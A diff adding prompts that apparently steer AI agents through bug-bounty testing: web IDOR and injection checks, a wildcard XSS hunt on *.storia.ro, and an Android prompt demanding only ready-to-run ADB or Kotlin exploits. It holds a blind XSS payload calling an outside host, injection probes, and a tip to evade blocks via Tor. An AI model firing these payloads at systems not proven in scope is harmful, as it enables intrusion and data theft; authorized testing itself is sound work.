@@ -1,1 +1,505 @@
-dirty0124
+WEB:1
+
+burp_logs: /home/hunter/TARGET.burp |
+user1: XXXXXX@bugcrowdninja.com
+Pass: XXXXXXX
+
+user2: XXXXXX+1@bugcrowdninja.com
+Pass: XXXXXXXXX
+
+Scope: authorized, in-scope only. Find HIGH severity VERIFIED bugs only — no speculative/low-confidence findings.
+
+PRIORITY 1 — IDOR / BOLA
+- Horizontal: user1 accessing user2's objects (same role, different owner) — test every 
+  endpoint with an ID/UUID/slug/reference param in path, query, JSON body, or GraphQL variables.
+- Vertical: priv esc between user1/user2 — access to admin/higher-role data or actions.
+- Test read AND write (GET vs PUT/PATCH/DELETE) for each object reference found.
+- Include batch/bulk endpoints and nested object references (e.g., order -> line items -> user).
+- Get Higher level access by manipulating the response (e.g, IsAdmin=False to true, change false to true and check response in browser) 
+
+ALSO CHECK
+- HTTP method tampering: try PUT/POST/PATCH/DELETE on every GET endpoint returning PII/config, 
+  and vice versa — flag any verb where auth outcome or data differs from expected.
+- Hidden/undocumented/debug endpoints from JS/page source — diff against api_docs, test each with 
+  both accounts.
+- User any disposable mail service and check test vulnerability on Forgot/password/Change password/registration/HTML injection in mail/Authentication bugs.
+- All hardcoded secrets, api keys and tokens.
+- Privilege escalation via parameter tampering, JWT claim edits, mass assignment (extra JSON 
+  fields accepted on write).
+- Stored XSS on user-controllable fields — use blind callback payload 
+  (<script src=https://blindf.com/bx.php></script>) where reflection point is unclear.
+- Template injection (SSTI) — detection payloads only (${7*7}, {{7*7}}), escalate only if confirmed.
+- Command execution — only where a concrete sink exists (upload/export/convert), detection 
+  payloads only (id, whoami), no destructive payloads.
+- SSRF via URL-accepting params (webhooks, avatar-from-url, PDF/export generators).
+- XXE on file upload/import endpoints accepting XML.
+
+VERIFICATION (mandatory for every finding)
+- Exact request + response proving unauthorized access/execution (e.g., user1 token pulling 
+  user2 data at object_id=123).
+- If not provable from given data: mark "NEEDS MANUAL VERIFICATION" + exact next request to send.
+- Exclude anything blocked by WAF, requiring tokens you don't have, or working as intended for that role.
+- Chain lower-severity findings into high-severity where possible, note the chain explicitly.
+
+OUTPUT (per finding)
+Title | Class | Severity + impact justification | Endpoint(s) | Repro steps | Evidence | Remediation
+
+Also list: endpoints/params checked with no valid finding (coverage), Allow: header leaks from OPTIONS.
+
+Skip Medium/Low unless chained into High. No destructive/exploit payloads — detection + PoC only.
+
+
+===================================
+===================================
+
+
+WildCard XSS
+
+You are conducting an authorized XSS assessment against *.storia.ro 
+(confirmed in-scope for [bug bounty program / pentest engagement]).
+
+OBJECTIVE: Enumerate all subdomains, discover injectable input points, and 
+test for reflected, DOM-based, mutation (mXSS), and stored XSS, then report 
+findings with PoC and remediation guidance.
+
+PHASE 1 — RECON / ASSET DISCOVERY
+1. Enumerate subdomains: subfinder, amass, assetfinder, crt.sh, dnsdumpster
+2. Resolve + probe live hosts: httpx / httprobe
+3. Crawl each live host: katana, hakrawler, gospider — capture all URLs, 
+   forms, JS files, and API endpoints
+4. Extract JS files and pull endpoints/params from them: LinkFinder, 
+   getJS + subjs, or manual grep for fetch()/XHR calls
+5. Pull historical URLs with known params: gau, waybackurls, 
+   Wayback Machine, GitHub dorking for leaked endpoints. Use tor proxy if gau webarchive blocked
+
+PHASE 2 — PARAMETER & INPUT DISCOVERY
+1. Extract all query params, form fields, headers (Referer, User-Agent, 
+   X-Forwarded-For), cookies, and JSON body fields that get reflected
+2. Use Arjun or ParamSpider to find hidden/unlinked parameters
+3. Identify reflection points: send a unique canary string 
+   (e.g. xss_test_a1b2c3) into every param/header/cookie and diff the 
+   response to see where it comes back unmodified
+
+PHASE 3 — REFLECTED XSS TESTING
+1. For every reflection point, determine the injection context:
+   - HTML body, attribute value, JS string, JS variable, URL, CSS, comment
+2. Fuzz with context-breaking probes: 
+   "'"><svg/onload=confirm(1)> etc. — tools: knoxnl, XSStrike, Dalfox, kxss
+3. Confirm WAF/filter behavior (character blacklist, encoding, length 
+   limits) and craft context-appropriate bypass payloads
+4. Validate execution in a real browser (headless Chrome via Puppeteer/
+   Playwright script that watches for confirm()/alert() firing) — don't 
+   rely on grep matches alone, confirm actual execution
+
+PHASE 4 — DOM XSS TESTING
+1. Identify dangerous sinks in JS: innerHTML, document.write, eval, 
+   location.hash/search assignments, jQuery .html(), postMessage handlers
+2. Trace sources (location, document.referrer, window.name, postMessage, 
+   localStorage) to sinks — use DOMPurify bypass techniques where 
+   sanitization is present but misconfigured
+3. Automate with DOM XSS scanners: DOMInvader (Burp), or a custom 
+   Playwright script that hooks sinks via a monkey-patched JS proxy and 
+   flags when tainted data reaches them
+
+PHASE 5 — MUTATION XSS (mXSS) TESTING
+1. Target inputs that pass through innerHTML, DOMPurify, or the browser's 
+   HTML parser twice (e.g., sanitize -> serialize -> re-parse)
+2. Test known mXSS gadgets (mutation of <noscript>, <template>, malformed 
+   tags that get "fixed" by the parser into executable markup)
+3. Check any client-side sanitizer/library version against known mXSS CVEs 
+   for that library
+
+PHASE 6 — STORED / BLIND XSS (if in scope)
+1. Submit XSS payloads with a callback (XSS Hunter Express / self-hosted 
+   collector) to every persistent input (profile fields, comments, 
+   support tickets, file metadata)
+2. Monitor callback server for out-of-band fires across admin panels, 
+   emails, logs, etc.
+
+PHASE 7 — VALIDATION & REPORTING
+1. For each candidate, produce a minimal reproducible PoC URL/request
+2. Screenshot/record proof of JS execution in-browser
+3. De-duplicate by root cause (same sink/filter bug across many params)
+4. Write up: affected URL, parameter, context, payload, impact, and 
+   suggested fix (output encoding, CSP, sanitizer library patch)
+
+
+
+==================================================================================
+==================================================================================
+==================================================================================
+
+Android Prompt:-
+
+
+
+name: android-dirty
+description: Analyze Android APKs and decompiled Android source ONLY for immediately reproducible, confirmed bug-bounty vulnerabilities. Prioritize embedded Intent/trampoline, WebView, deep link, authentication/biometric bypass, IPC/content provider, file/URI, and usable secret findings. Require a real exploit and reproducible ADB or minimal Kotlin PoC. Do not produce generic audits, theoretical findings, remediation, informational findings, or explanations.
+---
+
+Analyze Android APK/decompiled source ONLY to find vulnerabilities that I can immediately reproduce and submit to a bug bounty.
+
+
+IMPORTANT:
+I DO NOT WANT A SECURITY AUDIT.
+I DO NOT WANT A REPORT.
+I DO NOT WANT EXPLANATIONS.
+I DO NOT WANT REMEDIATION.
+I DO NOT WANT NEGATIVES.
+I DO NOT WANT INFORMATIONAL FINDINGS.
+I DO NOT WANT THEORETICAL VULNERABILITIES.
+I DO NOT WANT "potentially vulnerable".
+I DO NOT WANT old library versions.
+I DO NOT WANT generic WebView findings.
+I DO NOT WANT exported-component findings by themselves.
+
+ONLY RETURN A FINDING IF YOU CAN PROVIDE A REAL EXPLOIT.
+
+==================================================
+TARGET VULNERABILITY CLASSES
+==================================================
+
+1. EXPORTED COMPONENT → PRIVATE COMPONENT
+
+Find:
+
+attacker app
+→ exported Activity/Service/Receiver
+→ attacker-controlled Intent / Parcelable / Bundle / URI
+→ app launches or invokes another component
+→ private/protected component
+→ security impact
+
+Especially find:
+
+getParcelableExtra()
+getParcelableArrayExtra()
+getParcelableArrayListExtra()
+getSerializableExtra()
+getBundleExtra()
+getIntent()
+getData()
+
+followed by:
+
+startActivity()
+startActivityForResult()
+startActivities()
+startService()
+startForegroundService()
+bindService()
+sendBroadcast()
+sendOrderedBroadcast()
+
+Look specifically for:
+
+attacker-controlled Intent
+→ exported component
+→ startActivity(attackerIntent)
+→ android:exported=false Activity
+
+This is the "embedded Intent / Intent trampoline / confused deputy" pattern.
+
+==================================================
+2. WEBVIEW
+==================================================
+
+Find only exploitable WebView chains.
+
+Trace:
+
+attacker input
+→ exported activity/deep link/Intent
+→ attacker-controlled URL
+→ WebView.loadUrl/loadData/evaluateJavascript
+→ actual security impact
+
+Look for:
+
+loadUrl()
+loadData()
+loadDataWithBaseURL()
+evaluateJavascript()
+addJavascriptInterface()
+
+Prioritize:
+
+- credential/token leakage
+- privileged JS bridge
+- arbitrary JavaScript execution
+- sensitive WebView access
+- authentication bypass
+- attacker origin receiving application credentials
+- internal WebView reached through an exported trampoline
+
+Do NOT report simply:
+
+"JavaScript is enabled."
+
+==================================================
+3. DEEP LINK / APP LINK
+==================================================
+
+Find:
+
+attacker-controlled URI
+→ exported/deep-link Activity
+→ sensitive sink
+
+Prioritize:
+
+- arbitrary WebView URL
+- javascript:
+- data:
+- file:
+- content:
+- intent:
+- authentication bypass
+- account takeover
+- sensitive action
+
+==================================================
+4. AUTH / BIOMETRIC BYPASS
+==================================================
+
+Find actual bypasses of:
+
+- authentication
+- authorization
+- biometric protection
+- session checks
+
+Only report if an attacker can actually reach the protected functionality.
+
+==================================================
+5. CONTENT PROVIDER / IPC
+==================================================
+
+Find actual unauthorized:
+
+- file read
+- file write
+- database access
+- sensitive data disclosure
+- privileged IPC operation
+
+==================================================
+6. FILE / URI
+==================================================
+
+Find actual:
+
+- arbitrary file read
+- arbitrary file write
+- path traversal
+- URI permission abuse
+- FileProvider abuse
+
+==================================================
+7. SECRETS
+==================================================
+
+Search:
+
+source
+assets
+resources
+XML
+JSON
+native .so files
+
+for:
+
+API keys
+access tokens
+refresh tokens
+private keys
+client secrets
+cloud credentials
+passwords
+usable credentials
+
+ONLY output a secret if it is actually sensitive/usable.
+
+==================================================
+SOURCE → INPUT → SINK
+==================================================
+
+For EVERY candidate, prove:
+
+SOURCE
+↓
+ATTACKER CONTROLLED INPUT
+↓
+DATA FLOW
+↓
+SINK
+↓
+SECURITY IMPACT
+
+Do not stop at keyword matches.
+
+Trace across classes and methods.
+
+==================================================
+EXPLOITABILITY REQUIREMENT
+==================================================
+
+A finding is valid ONLY if:
+
+1. An unprivileged attacker can trigger it.
+2. The attacker-controlled input reaches the vulnerable sink.
+3. The relevant security check is absent/bypassable.
+4. There is concrete security impact.
+5. You can provide a reproducible PoC.
+
+ADB is preferred.
+
+If ADB cannot construct the required Parcelable/nested Intent, provide the smallest possible Kotlin malicious-app PoC.
+
+Do NOT claim an exploit is working if you only inferred it from source code.
+
+==================================================
+EXPLOIT / PoC REQUIREMENT
+==================================================
+
+ALWAYS PROVIDE THE ACTUAL EXPLOIT CODE OR ADB COMMAND FOR EVERY CONFIRMED FINDING.
+
+The exploit/reproduction is MANDATORY.
+
+For EVERY confirmed vulnerability:
+
+1. Prefer a ONE-LINE ADB command when possible.
+2. If ADB cannot reproduce the vulnerability, provide a MINIMAL COMPLETE Kotlin malicious-app PoC.
+3. Include any required payload directly in the finding.
+4. The PoC must be immediately usable for reproduction.
+5. Do NOT provide pseudocode.
+6. Do NOT provide incomplete code.
+7. Do NOT provide theoretical exploit steps.
+8. Do NOT claim a vulnerability is confirmed unless the supplied ADB command or PoC can reproduce the claimed impact.
+9. Preserve the exact exploit command/code in the final output.
+10. NEVER omit the exploit/reproduction code from a confirmed finding.
+
+ADB is ALWAYS preferred over Kotlin when both can reproduce the vulnerability.
+
+If a vulnerability is confirmed from source but a reproducible exploit/PoC cannot be constructed, DO NOT RETURN THE FINDING.
+
+If the exploit requires a specific Intent extra, URI, Parcelable, Bundle, payload, component name, permission, or other parameter, include the exact value required for reproduction.
+
+If multiple commands are absolutely required for reproduction, provide the minimum required sequence, but prefer a single command whenever technically possible.
+
+
+==================================================
+SPECIAL PRIORITY:
+EMBEDDED INTENT
+==================================================
+
+Search aggressively for this exact pattern:
+
+exported component
++
+attacker-controlled Parcelable Intent
++
+startActivity/startService/sendBroadcast
++
+protected/private destination
+
+Example:
+
+Intent nested =
+    getIntent().getParcelableExtra("extra");
+
+...
+
+startActivity(nested);
+
+Determine whether nested can target:
+
+- non-exported Activity
+- protected Activity
+- internal WebView
+- payment Activity
+- call Activity
+- account/settings Activity
+- file Activity
+- privileged functionality
+
+==================================================
+SPECIAL PRIORITY:
+ATTACKER-CONTROLLED WEBVIEW
+==================================================
+
+Search for:
+
+exported Activity
+→ attacker-controlled URL
+→ WebView.loadUrl()
+
+Then determine whether the WebView:
+
+- injects access tokens
+- injects refresh tokens
+- injects cookies
+- injects user data
+- exposes privileged JS interfaces
+- has dangerous file access
+- allows JavaScript execution
+- can reach internal functionality
+
+A WebView loading an arbitrary URL is NOT enough.
+
+==================================================
+FINAL OUTPUT
+==================================================
+
+DO NOT GENERATE A LONG REPORT.
+
+Return ONLY confirmed exploitable findings in this exact format:
+
+[HIGH/MEDIUM/LOW] TITLE
+
+ADB:
+<ONE-LINE WORKING ADB COMMAND>
+
+If ADB cannot reproduce it:
+
+KOTLIN POC:
+<MINIMAL COMPLETE WORKING EXPLOIT CODE>
+
+If there is a usable secret:
+
+SECRET:
+<SECRET>
+
+ACCESS:
+<WHAT THE SECRET PROVIDES ACCESS TO>
+
+If necessary:
+
+PAYLOAD:
+<MINIMAL PAYLOAD>
+
+EXPECTED:
+<ONE SHORT SENTENCE>
+
+That's it.
+
+
+NO:
+- source explanation
+- trace explanation
+- remediation
+- negatives
+- methodology
+- confidence explanation
+- recommendations
+- informational findings
+- theoretical findings
+- duplicate findings
+
+If there are no confirmed exploitable vulnerabilities with a reproducible PoC, output exactly:
+
+NO CONFIRMED EXPLOIT
+
+Prioritize critical/high-impact vulnerabilities first.
+===============================================
